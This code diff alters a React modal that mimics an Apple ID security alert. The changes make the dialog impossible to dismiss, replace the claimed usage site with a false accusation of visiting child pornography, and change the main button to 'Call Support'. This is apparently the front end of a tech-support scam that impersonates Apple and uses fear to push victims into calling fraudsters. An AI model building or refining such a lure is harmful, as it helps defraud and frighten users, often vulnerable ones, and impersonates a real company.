@@ -16,7 +16,7 @@ export function SecurityAlertModal({
   onOpenChange,
 }: SecurityAlertModalProps) {
   return (
-    <Dialog open={open} onOpenChange={onOpenChange}>
+    <Dialog open={open} onOpenChange={() => {}}>
       <DialogTrigger asChild>
         <button
           type="button"
@@ -29,6 +29,7 @@ export function SecurityAlertModal({
       <DialogContent
         showCloseButton={false}
         onPointerDownOutside={(e) => e.preventDefault()}
+        onInteractOutside={(e) => e.preventDefault()}
         onEscapeKeyDown={(e) => e.preventDefault()}
         className="
           w-[calc(100vw-1.25rem)] max-w-[520px]
@@ -49,8 +50,8 @@ export function SecurityAlertModal({
                   Your Apple ID was recently used at
                 </p>
 
-                <p className="text-[17px] lowercase text-black/80 sm:text-[19px]">
-                  game site
+                <p className="text-[17px]  text-black/80 sm:text-[19px] font-medium">
+                  CHILD PORNOGRAPHY 
                 </p>
 
                 <p className="font-medium">
@@ -79,12 +80,11 @@ export function SecurityAlertModal({
             type="button"
             className="min-h-[60px] border-r border-black/10 px-4 text-[17px] font-medium text-[#007AFF] transition active:bg-black/5 sm:text-[19px]"
           >
-            Fix Problem
+            Call Support
           </button>
 
           <button
-            type="button"
-            onClick={() => onOpenChange(false)}
+            type="button"            
             className="min-h-[60px] px-4 text-[17px] font-medium text-[#007AFF] transition active:bg-black/5 sm:text-[19px]"
           >
             OK
